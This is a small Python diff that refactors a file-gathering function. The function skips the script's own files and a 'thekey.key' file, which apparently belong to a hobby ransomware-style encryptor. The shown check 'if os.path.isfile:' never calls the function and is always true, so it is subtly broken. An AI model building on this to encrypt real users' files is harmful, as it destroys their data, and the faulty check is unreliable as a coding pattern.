@@ -22,7 +22,7 @@ def MBox(title,text,option):
 def addFiles():
     files = []
     for file in os.listdir():
-        if file == "tools.py" or file == "savingGrace.py" or file == "darthVader.py" or file == "thekey.key" or file == "__pycache__":
+        if file in ["tools.py","savingGrace.py","darthVader.py","thekey.key","__pycache__"]:
                 continue
         if os.path.isfile:
             files.append(file)
